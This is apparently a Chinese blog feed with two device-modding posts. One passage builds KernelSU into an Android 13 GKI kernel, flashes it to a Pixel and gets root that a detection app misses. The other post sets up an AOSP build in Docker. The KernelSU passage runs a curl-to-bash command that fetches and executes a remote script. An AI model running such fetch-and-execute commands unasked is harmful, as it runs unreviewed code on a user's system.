class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@4cd0e87f2387:~/aosp/kernel_android13_5_10_107<span class="hljs-comment"># curl -LSs &quot;https://raw.githubusercontent.com/tiann/KernelSU/main/kernel/setup.sh&quot; | bash -</span><br>++ <span class="hljs-built_in">pwd</span><br>+ GKI_ROOT=/root/aosp/kernel_android13_5_10_107<br>+ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;[+] GKI_ROOT: /root/aosp/kernel_android13_5_10_107&#x27;</span><br>[+] GKI_ROOT: /root/aosp/kernel_android13_5_10_107<br>+ <span class="hljs-built_in">test</span> -d /root/aosp/kernel_android13_5_10_107/common/drivers<br>+ DRIVER_DIR=/root/aosp/kernel_android13_5_10_107/common/drivers<br>+ <span class="hljs-built_in">test</span> -d /root/aosp/kernel_android13_5_10_107/KernelSU<br>+ git <span class="hljs-built_in">clone</span> https://github.com/tiann/KernelSU<br>Cloning into <span class="hljs-string">&#x27;KernelSU&#x27;</span>...<br>remote: Enumerating objects: 12723, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (120/120), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (66/66), <span class="hljs-keyword">done</span>.<br>remote: Total 12723 (delta 53), reused 98 (delta 39), pack-reused 12603<br>Receiving objects: 100% (12723/12723), 12.04 MiB | 552.00 KiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (7655/7655), <span class="hljs-keyword">done</span>.<br>+ <span class="hljs-built_in">cd</span> /root/aosp/kernel_android13_5_10_107/KernelSU<br>+ git stash<br>No <span class="hljs-built_in">local</span> changes to save<br>++ git status<br>++ grep -Po <span class="hljs-string">&#x27;v\d+(\.\d+)*&#x27;</span><br>++ <span class="hljs-built_in">head</span> -n1<br>+ <span class="hljs-string">&#x27;[&#x27;</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-string">&#x27;]&#x27;</span><br>+ git pull<br>Already up to <span class="hljs-built_in">date</span>.<br>+ <span class="hljs-string">&#x27;[&#x27;</span> -z <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-string">&#x27;]&#x27;</span><br>++ git describe --abbrev=0 --tags<br>+ git checkout v0.7.2<br>Note: checking out <span class="hljs-string">&#x27;v0.7.2&#x27;</span>.<br><br>You are <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;detached HEAD&#x27;</span> state. You can look around, make experimental<br>changes and commit them, and you can discard any commits you make <span class="hljs-keyword">in</span> this<br>state without impacting any branches by performing another checkout.<br><br>If you want to create a new branch to retain commits you create, you may<br><span class="hljs-keyword">do</span> so (now or later) by using -b with the checkout <span class="hljs-built_in">command</span> again. Example:<br><br>  git checkout -b &lt;new-branch-name&gt;<br><br>HEAD is now at afefe20 ci: fix clippy<br>+ <span class="hljs-built_in">cd</span> /root/aosp/kernel_android13_5_10_107<br>+ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;[+] GKI_ROOT: /root/aosp/kernel_android13_5_10_107&#x27;</span><br>[+] GKI_ROOT: /root/aosp/kernel_android13_5_10_107<br>+ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;[+] Copy kernel su driver to /root/aosp/kernel_android13_5_10_107/common/drivers&#x27;</span><br>[+] Copy kernel su driver to /root/aosp/kernel_android13_5_10_107/common/drivers<br>+ <span class="hljs-built_in">cd</span> /root/aosp/kernel_android13_5_10_107/common/drivers<br>+ <span class="hljs-built_in">test</span> -d /root/aosp/kernel_android13_5_10_107/common/drivers<br>+ <span class="hljs-built_in">ln</span> -sf ../../KernelSU/kernel kernelsu<br>+ <span class="hljs-built_in">cd</span> /root/aosp/kernel_android13_5_10_107<br>+ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;[+] Add kernel su driver to Makefile&#x27;</span><br>[+] Add kernel su driver to Makefile<br>+ DRIVER_MAKEFILE=/root/aosp/kernel_android13_5_10_107/common/drivers/Makefile<br>+ DRIVER_KCONFIG=/root/aosp/kernel_android13_5_10_107/common/drivers/Kconfig<br>+ grep -q kernelsu /root/aosp/kernel_android13_5_10_107/common/drivers/Makefile<br>+ <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;obj-$(CONFIG_KSU) += kernelsu/\n&#x27;</span><br>+ grep -q kernelsu /root/aosp/kernel_android13_5_10_107/common/drivers/Kconfig<br>+ sed -i <span class="hljs-string">&#x27;/endmenu/i\source &quot;drivers/kernelsu/Kconfig&quot;&#x27;</span> /root/aosp/kernel_android13_5_10_107/common/drivers/Kconfig<br>+ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;[+] Done.&#x27;</span><br>[+] Done.<br><br></code></pre></td></tr></table></figure><p>重新编译一遍</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs gams">  LZ4     arch/arm64/boot/Image.lz4<br>  GZIP    arch/arm64/boot/Image.gz<br>  MODPOST modules-only.symvers<br>  GEN     Module.symvers<br>+ <span class="hljs-keyword">set</span> +x<br>========================================================<br> Checking <span class="hljs-comment">the list of modules:</span><br>========================================================<br> Comparing <span class="hljs-comment">the KMI and the symbol lists:</span><br>+ gki_modules_list=/root/aosp/kernel_android13_5_10_107/common/android/gki_system_dlkm_modules<br>++ sed <span class="hljs-comment">&#x27;s/\.ko$//&#x27;</span> /root/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">common</span>/android/<span class="hljs-comment">gki_system_dlkm_modules</span><br>++ tr <span class="hljs-comment">&#x27;\n&#x27;</span> <span class="hljs-comment">&#x27; &#x27;</span><br>+ KMI_STRICT_MODE_OBJECTS=<span class="hljs-string">&#x27;vmlinux &#x27;</span><br>+ /root/aosp/kernel_android13_5_10_107/build/abi/compare_to_symbol_list /root/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">out</span>/android13<span class="hljs-number">-5.10</span>/<span class="hljs-comment">common</span>/Module.symvers /<span class="hljs-comment">root</span>/aosp/<span class="hljs-comment">kernel_android13_5_10_107</span>/out/<span class="hljs-comment">android13-5.10</span>/common/<span class="hljs-comment">abi_symbollist.raw</span><br>+ <span class="hljs-keyword">set</span> <span class="hljs-comment">+x</span><br>========================================================<br> Installing <span class="hljs-comment">kernel modules into staging directory</span><br>  DEPMOD  <span class="hljs-comment">5.10.198-android13-4-00014-g4fb32a1f29a6-dirty</span><br>========================================================<br> Generating <span class="hljs-comment">gki_certification_tools.tar.gz</span><br>========================================================<br> Generating <span class="hljs-comment">test_mappings.zip</span><br>========================================================<br> Copying <span class="hljs-comment">files</span><br>  arch/arm64/boot/Image<br>  vmlinux<br>  <span class="hljs-keyword">System</span>.map<br>  vmlinux.symvers<br>  modules.builtin<br>  modules.builtin.modinfo<br>  arch/arm64/boot/Image.lz4<br>  arch/arm64/boot/Image.gz<br>========================================================<br> Installing UAPI kernel headers:<br>make: Entering directory <span class="hljs-comment">&#x27;/root/aosp/kernel_android13_5_10_107/out/android13-5.10/common&#x27;</span><br>  INSTALL /root/aosp/kernel_android13_5_10_107/out/android13-5.10/kernel_uapi_headers/usr/include<br>make: Leaving directory <span class="hljs-comment">&#x27;/root/aosp/kernel_android13_5_10_107/out/android13-5.10/common&#x27;</span><br> Copying kernel UAPI headers to /root/aosp/kernel_android13_5_10_107/out/android13-5.10/dist/kernel-uapi-headers.tar.gz<br>========================================================<br> Copying <span class="hljs-comment">kernel headers to</span> /root/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">out</span>/android13<span class="hljs-number">-5.10</span>/<span class="hljs-comment">dist</span>/kernel-headers.tar.gz<br>~/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">common</span> ~/aosp/<span class="hljs-comment">kernel_android13_5_10_107</span><br>~/aosp/kernel_android13_5_10_107<br>========================================================<br> Creating <span class="hljs-comment">system_dlkm image</span><br>========================================================<br> Files <span class="hljs-comment">copied to</span> /root/<span class="hljs-comment">aosp</span>/kernel_android13_5_10_107/<span class="hljs-comment">out</span>/android13<span class="hljs-number">-5.10</span>/<span class="hljs-comment">dist</span><br>Creating <span class="hljs-comment">boot-img.tar.gz for gki-info.txt boot.img boot-gz.img boot-lz4.img</span><br></code></pre></td></tr></table></figure><h3 id="编译结果out"><a href="#编译结果out" class="headerlink" title="编译结果out"></a>编译结果out</h3><p>编译后的目录，可以看到多了一个out 目录和KernelSU目录，内核二进制文件、模块和相应的映像位于 out&#x2F;android13-5.10&#x2F;dist 目录下</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@4cd0e87f2387:~/aosp/kernel_android13_5_10_107<span class="hljs-comment"># ls -al</span><br>total 56<br>drwxr-xr-x<span class="hljs-number"> 13 </span>root root<span class="hljs-number"> 4096 </span>Jan <span class="hljs-number"> 4 </span>03:35 .<br>drwxr-xr-x <span class="hljs-number"> 8 </span>root root<span class="hljs-number"> 4096 </span>Jan <span class="hljs-number"> 3 </span>09:54 ..<br>drwxr-xr-x <span class="hljs-number"> 7 </span>root root<span class="hljs-number"> 4096 </span>Jan <span class="hljs-number"> 3 </span>09:50 .repo<br>lrwxrwxrwx <span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 6 </span>Jan <span class="hljs-number"> 3 </span>09:25 .source_date_epoch_dir -&gt; common<br>drwxr-xr-x<span class="hljs-number"> 10 </span>root root<span class="hljs-number"> 4096 </span>Jan <span class="hljs-number"> 4 </span>03:35 KernelSU<br>lrwxrwxrwx <span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 34 </span>Jan <span class="hljs-number"> 3 </span>09:18 WORKSPACE -&gt; build/kernel/kleaf/bazel.WORKSPACE<br>drwxr-xr-x <span class="hljs-number"> 4 </span>root root<span class="hljs-number"> 4096 </span>Jan <span class="hljs-number"> 3 </span>09:18 build<br>drwxr-xr-x<span class="hljs-number"> 27 </span>root root<span class="hljs-number"> 4096 </span>Jan <span class="hljs-number"> 3 </span>14:47 common<br>drwxr-xr-x <span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span>Jan <span class="hljs-number"> 3 </span>09:18 common-modules<br>drwxr-xr-x <span class="hljs-number"> 5 </span>root root<span class="hljs-number"> 4096 </span>Jan <span class="hljs-number"> 3 </span>09:18 external<br>drwxr-xr-x <span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span>Jan <span class="hljs-number"> 3 </span>09:18 hikey-modules<br>drwxr-xr-x <span class="hljs-number"> 4 </span>root root<span class="hljs-number"> 4096 </span>Jan <span class="hljs-number"> 3 </span>09:18 kernel<br>-rw-r--r-- <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 3823 </span>Jan <span class="hljs-number"> 3 </span>08:44 manifest_91.xml<br>drwxr-xr-x <span class="hljs-number"> 5 </span>root root<span class="hljs-number"> 4096 </span>Jan <span class="hljs-number"> 4 </span>03:05 out<br>drwxr-xr-x<span class="hljs-number"> 10 </span>root root<span class="hljs-number"> 4096 </span>Jan <span class="hljs-number"> 3 </span>09:19 prebuilts<br>drwxr-xr-x <span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span>Jan <span class="hljs-number"> 3 </span>09:19 tools<br></code></pre></td></tr></table></figure><p>在out目录内，可以看到<br><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240104170104525.png"></p><h2 id="刷入到手机内"><a href="#刷入到手机内" class="headerlink" title="刷入到手机内"></a>刷入到手机内</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">E</span>:\file\KernelSU&gt;adb reboot bootloader<br><br><span class="hljs-attribute">E</span>:\file\KernelSU&gt;fastboot flash boot boot.img<br><span class="hljs-attribute">Sending</span> &#x27;boot_a&#x27; (<span class="hljs-number">65536</span> KB)                        OKAY<span class="hljs-meta"> [  2.135s]</span><br><span class="hljs-attribute">Writing</span> &#x27;boot_a&#x27;                                   OKAY<span class="hljs-meta"> [  0.081s]</span><br><span class="hljs-attribute">Finished</span>. Total time: <span class="hljs-number">2</span>.<span class="hljs-number">228</span>s<br><br><span class="hljs-attribute">E</span>:\file\KernelSU&gt;fastboot reboot<br><span class="hljs-attribute">Rebooting</span>                                          OKAY<span class="hljs-meta"> [  0.001s]</span><br><span class="hljs-attribute">Finished</span>. Total time: <span class="hljs-number">0</span>.<span class="hljs-number">007</span>s<br></code></pre></td></tr></table></figure><h3 id="查看KernelSU"><a href="#查看KernelSU" class="headerlink" title="查看KernelSU"></a>查看KernelSU</h3><p><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240104170806428.png"></p><h3 id="开启root"><a href="#开启root" class="headerlink" title="开启root"></a>开启root</h3><p><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240104170838494.png"></p><h3 id="root检测（检测不出来）"><a href="#root检测（检测不出来）" class="headerlink" title="root检测（检测不出来）"></a>root检测（检测不出来）</h3><p><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240111182343319.png"></p><h3 id="查看内核"><a href="#查看内核" class="headerlink" title="查看内核"></a>查看内核</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-symbol">E:</span>\file\KernelSU&gt;adb shell<br><span class="hljs-symbol">raven:</span>/ <span class="hljs-variable">$ </span>uname -a<br>Linux localhost <span class="hljs-number">5.10</span>.<span class="hljs-number">198</span>-android13-<span class="hljs-number">4</span>-<span class="hljs-number">0</span>0014-g4fb32a1f29a6-dirty <span class="hljs-comment">#1 SMP PREEMPT Wed Dec 27 01:56:34 UTC 2023 aarch64 Toybox</span><br><span class="hljs-symbol">raven:</span>/ <span class="hljs-variable">$ </span>su<br><span class="hljs-regexp">/system/bin</span><span class="hljs-regexp">/sh: su: inaccessible or not found</span><br><span class="hljs-regexp">127|raven:/</span> <span class="hljs-variable">$ </span>su<br><span class="hljs-symbol">raven:</span>/ <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="查看-ro-debuggable"><a href="#查看-ro-debuggable" class="headerlink" title="查看 ro.debuggable"></a>查看 ro.debuggable</h3><p><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240111105550320.png"></p><h2 id="KernelSU模块"><a href="#KernelSU模块" class="headerlink" title="KernelSU模块"></a>KernelSU模块</h2><h2 id="其他思考"><a href="#其他思考" class="headerlink" title="其他思考"></a>其他思考</h2><h3 id="INFO-1"><a href="#INFO-1" class="headerlink" title="INFO 1"></a>INFO 1</h3><p>在GKI 源码目录common 内，看到有debug的文件，猜测是不是编译的时候加入这个选项，就可以开启内核调试了。</p><p><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240104160406917.png"><br>GTP 回答</p><blockquote></blockquote><p><code>build.config.gki-debug.aarch64</code>和<code>build.config.gki.aarch64</code>是Android内核构建过程中使用的两个不同的配置文件。它们的区别在于构建选项和调试功能的开启程度。<br><code>build.config.gki.aarch64</code>是用于构建GKI（Generic Kernel Image）的配置文件，它是一个精简的、通用的内核映像。这个配置文件主要用于生产环境中构建内核，通常会关闭一些调试相关的选项，以提高性能和减小内核映像的大小。<br>相比之下，<code>build.config.gki-debug.aarch64</code>是用于构建调试版本的GKI的配置文件。它在构建过程中包含了更多的调试选项，以支持开发和调试工作。这些调试选项可以帮助开发者进行内核的故障排除和性能分析。<br>具体来说，<code>build.config.gki-debug.aarch64</code>可能会打开一些额外的调试选项，如内核符号表的生成、动态跟踪功能的启用、内核调试器（如KGDB）的支持等。这些选项会增加内核映像的大小，并且可能会对性能产生一些影响，但可以提供更丰富的调试信息和功能。<br>因此，选择使用哪个配置文件取决于你的需求。如果你正在进行生产环境的构建，并追求最佳性能和较小的内核映像大小，那么你可以使用<code>build.config.gki.aarch64</code>。如果你需要进行开发、调试或故障排除工作，并且对调试功能和信息更感兴趣，那么你可以选择<code>build.config.gki-debug.aarch64</code>。<br>请注意，在使用这些配置文件之前，你需要确认它们是否适用于你的构建环境和项目需求，并根据实际情况进行相应的配置和调整</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>官方guide<br><a href="https://kernelsu.org/zh_CN/guide/installation.html">https://kernelsu.org/zh_CN/guide/installation.html</a></p><p><a href="https://source.android.com/docs/setup/build/building-kernels?hl=zh-cn">https://source.android.com/docs/setup/build/building-kernels?hl=zh-cn</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pixel 6Pro AOSP源码在Docker内编译全过程</title>
    <link href="/2024/02/08/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B/"/>
    <url>/2024/02/08/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记录了编译AOSP源码，刷入到pixel 6P 手机内的过程，从搭建环境，到编译源码，然后刷入到手机内，其中遇到了很多的问题，对AOSP 源码编译感兴趣或者想学习自己编译ASOP请往下看，google 官方的文档是很好的资料，一定要把文档看完整。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p>由于我用的是服务器编译的：docker + Ubuntu 18.04 + 64 核 + 2T (外置硬盘) </p><p>手机： pixel 6Pro</p><h3 id="docker环境安装"><a href="#docker环境安装" class="headerlink" title="docker环境安装"></a>docker环境安装</h3><p>由于AOSP源码编译，官方推荐Linux 的Ubuntu 来编译。因此这里直接拉取ubuntu 18.04 的镜像。由于我是在服务器内进行编译，所以使用docker做环境隔离可以避免很多问题。</p><p>首先要说明，由于AOSP源码需要的硬盘容量很大，我在同步源码的时候，300G 都不太够，所以后面加了一个外置的硬盘，并且挂载到了 &#x2F;mnt&#x2F;data 内，然后使用docker 再将 &#x2F;mnt&#x2F;data 挂载到容器内，因此如果自己的硬盘容量够的话，就不需要再挂载到容器内了，直接同步代码就行。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">挂载外部存储并创建镜像<br>docker <span class="hljs-keyword">run</span><span class="language-bash"> -v /mnt/data/tiger_aosp:/root/aosp --name tiger_ubuntu18.04 -it ubuntu:18.04</span><br></code></pre></td></tr></table></figure><p>这里要注意的是，由于我之前没考虑硬盘的问题，docker 并不能将主机的目录挂载到已经创建的镜像内，不允许在运行时更改容器的存储配置。必须要在创建之前定义所有的存储配置。这导致我先前安装好的环境，不得不重新安装一遍。</p><h3 id="ubuntu-18-04-依赖安装"><a href="#ubuntu-18-04-依赖安装" class="headerlink" title="ubuntu 18.04 依赖安装"></a>ubuntu 18.04 依赖安装</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs vim"><br>apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br><br>sudo apt-<span class="hljs-built_in">get</span> install git-core gnupg flex bison build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 libncurses5-dev lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z1-dev libgl1-mesa-dev libxml2-utils xsltproc unzip fontconfig <span class="hljs-keyword">python</span><br><br>apt upgrade<br>apt install <span class="hljs-keyword">vim</span><br>apt install iputils-ping 下载ping<br><br>apt install busybox -<span class="hljs-keyword">y</span> 下载busybox<br><br>apt-<span class="hljs-built_in">get</span> install openjdk-<span class="hljs-number">8</span>-jdk  下载java 运行环境<br><br>apt-<span class="hljs-built_in">get</span> install repo<br>repo <span class="hljs-keyword">version</span> 查看版本<br><br>apt-<span class="hljs-built_in">get</span> install git<br><br>apt intall zip 避免编译报错<br><br><span class="hljs-keyword">ln</span> -s /usr/bin/<span class="hljs-keyword">python3</span> /usr/bin/<span class="hljs-keyword">python</span> # repo 需要<span class="hljs-keyword">python3</span>版本,最好<span class="hljs-keyword">python3</span>.<span class="hljs-number">6</span>，因为<span class="hljs-keyword">python3</span>.<span class="hljs-number">8</span>有点错误。<br><br></code></pre></td></tr></table></figure><p><img src="/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B.assets/image-20231219140507109.png"></p><h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><p>docker start containerID<br>docker exec -it containerID &#x2F;bin&#x2F;bash</p><p>为了每次方便启动，我把这两条命令写到了sh文件。</p><h2 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h2><p>在下载源码之前先配置config</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs verilog">git <span class="hljs-keyword">config</span> --<span class="hljs-keyword">global</span> user<span class="hljs-variable">.email</span> <span class="hljs-string">&quot;you@example.com&quot;</span><br>git <span class="hljs-keyword">config</span> --<span class="hljs-keyword">global</span> user<span class="hljs-variable">.name</span> <span class="hljs-string">&quot;Your Name&quot;</span><br>git <span class="hljs-keyword">config</span> -l<br></code></pre></td></tr></table></figure><h3 id="确定分支"><a href="#确定分支" class="headerlink" title="确定分支"></a>确定分支</h3><p>接下来就要来选择要编译的源码分支，这里我选择的是 android-13.0.0_r43，因为份源码支持的设备比较多。<br>记住如果是按照官网中的</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">repo init -u https:<span class="hljs-regexp">//</span>android.googlesource.com<span class="hljs-regexp">/platform/m</span>anifest<br></code></pre></td></tr></table></figure><p>来同步源码，那么同步的将是最新的源码。因此需要执行分支。</p><p>在AOSP官方文档中，可以看到对应的分支、版本、和支持设备的关联列表。<br><a href="https://source.android.com/docs/setup/about/build-numbers?hl=zh-cn#source-code-tags-and-builds">https://source.android.com/docs/setup/about/build-numbers?hl=zh-cn#source-code-tags-and-builds</a><br><img src="/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B.assets/image-20240204105819686.png"></p><p>首先使用repo 来指定需要同步的分支，下载对应的manifest.xml文件，-b 参数用于执行分支名称。</p><blockquote><p>repo init -u <a href="https://android.googlesource.com/platform/manifest">https://android.googlesource.com/platform/manifest</a> -b android-13.0.0_r43</p></blockquote><p><img src="/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B.assets/image-20240204110758147.png"></p><p>查看  manifests.xml ，确定是否是需要的版本，因为我在之前把43写成了44分支，导致编译完后，刷到手机里，手机成砖了，所以分支一定要对应。<br><img src="/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B.assets/image-20240204105551600.png"><br>当然，如果想要查看当前所有的分支</p><blockquote><p>cd .repo&#x2F;manifest<br>git branch -a<br><img src="/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B.assets/image-20231221181130383.png"></p></blockquote><h3 id="同步源码"><a href="#同步源码" class="headerlink" title="同步源码"></a>同步源码</h3><p>由于我的服务器是可以直接同步android源码的，所以如果是在国内的网络环境中，就需要设置代理，或者直接使用清华的源。这里就不做介绍了。</p><p>同步源码</p><blockquote><p>repo sync<br>看到successfully 就表示同步完成了。<br><img src="/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B.assets/image-20231220151508175.png"></p></blockquote><h3 id="AOSP-源码目录"><a href="#AOSP-源码目录" class="headerlink" title="AOSP 源码目录"></a>AOSP 源码目录</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@<span class="hljs-number">4</span>cd0e87f2387:~/aosp/<span class="hljs-number">1</span>_test# ls -al<br><span class="hljs-attribute">total</span> <span class="hljs-number">120</span><br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">27</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">12</span> .<br><span class="hljs-attribute">drwxr</span>-xr-x   <span class="hljs-number">3</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">06</span>:<span class="hljs-number">15</span> ..<br><span class="hljs-attribute">drwxr</span>-xr-x   <span class="hljs-number">7</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span> .repo<br><span class="hljs-attribute">lrwxrwxrwx</span>   <span class="hljs-number">1</span> root root    <span class="hljs-number">19</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span> Android.bp -&gt; build/soong/root.bp<br><span class="hljs-attribute">lrwxrwxrwx</span>   <span class="hljs-number">1</span> root root    <span class="hljs-number">23</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span> BUILD -&gt; build/bazel/bazel.BUILD<br><span class="hljs-attribute">lrwxrwxrwx</span>   <span class="hljs-number">1</span> root root    <span class="hljs-number">27</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span> WORKSPACE -&gt; build/bazel/bazel.WORKSPACE<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">37</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span> art  // android 